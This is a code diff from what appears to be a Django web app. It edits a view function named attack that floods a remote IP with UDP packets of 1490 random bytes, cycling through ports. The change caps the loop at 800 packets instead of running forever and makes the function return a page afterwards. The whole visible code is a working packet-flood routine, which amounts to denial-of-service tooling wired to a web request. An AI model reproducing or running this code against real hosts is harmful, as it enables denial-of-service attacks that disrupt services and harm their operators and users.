@@ -264,14 +264,14 @@ def attack(request):
     bytes = random._urandom(1490)
     sent = 0
     port=80
-    while True:
+    while sent<800:
         sock2.sendto(bytes, (remoteServerIP2,port))
         sent = sent + 1
         port = port + 1
         print ("Sent %s packet to %s throught port:%s"%(sent,remoteServerIP2,port))
         if port == 65534:
             port = 1
-
+    return render_to_response('index.html')
 # def urlscraper(url):
        
     
